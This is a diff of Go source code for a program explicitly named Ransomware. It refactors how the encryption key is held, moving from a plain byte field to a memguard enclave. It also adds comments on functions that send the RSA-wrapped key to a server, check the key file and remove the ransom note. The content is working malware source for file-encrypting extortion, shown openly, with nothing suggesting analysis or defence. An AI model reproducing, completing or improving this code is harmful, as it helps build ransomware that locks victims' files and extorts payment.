@@ -17,7 +17,6 @@ import (
 
 // Ransomware holds all the needed client information needed to go forward with the ransom.
 type Ransomware struct {
-	Key         []byte
 	MemguardKey *memguard.Enclave
 	PublicKey   string
 	RootDir     string
@@ -82,21 +81,8 @@ func checkIfEncrypted(rootPath string) bool {
 	return true
 }
 
-// WriteKeyFile takes in the ransomware's key and writes the rsa public key encrypted
-// version of the key into a file called 'key.txt'
-func (rw *Ransomware) WriteKeyFile() error {
-	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key, rw.Data.UUID)
-	if err != nil {
-		return err
-	}
-
-	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
-		return err
-	}
-
-	return nil
-}
-
+// GetValidKeyFromServer sends a post request which contains the encryption key and then the
+// server decrypts the key using the rsa private key and sends it back.
 func (rw *Ransomware) GetValidKeyFromServer() error {
 	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
 	if err != nil {
@@ -119,6 +105,8 @@ func (rw *Ransomware) GetValidKeyFromServer() error {
 	return nil
 }
 
+// CheckIfValidMemSafeKey checks if the key inside the memguard enclave is the same as the key
+// written inside of key.txt
 func (rw *Ransomware) CheckIfValidMemSafeKey() bool {
 	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
 	if err != nil {
@@ -141,6 +129,8 @@ func (rw *Ransomware) CheckIfValidMemSafeKey() bool {
 	return false
 }
 
+// WriteMemSafeKey writes the encryption key to a file using a public key from the server.
+// The key is passed through crypt.EncryptKey, whichs gets the public key and encrypts it as well.
 func (rw *Ransomware) WriteMemSafeKey() error {
 	b, err := rw.MemguardKey.Open()
 	if err != nil {
@@ -170,19 +160,6 @@ func (rw *Ransomware) RemoveKeyFile() error {
 	return nil
 }
 
-func (rw *Ransomware) CheckIfValidKey() bool {
-	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
-	if err != nil {
-		return false
-	}
-
-	if bytes.Equal(key, rw.Key) {
-		return true
-	}
-
-	return false
-}
-
 // RemoveRansomFile removes the generated ransom file which notifies user that the computer
 // is under ransom.
 func (rw *Ransomware) RemoveRansomFile() error {
@@ -202,8 +179,8 @@ func NewRansomware(toEncrypt string) (*Ransomware, error) {
 	}
 
 	return &Ransomware{
-		RootDir: toEncrypt,
-		Key:     key,
-		Data:    victim.NewVictimIndentifer(),
+		RootDir:     toEncrypt,
+		MemguardKey: memguard.NewEnclave(key),
+		Data:        victim.NewVictimIndentifer(),
 	}, nil
 }
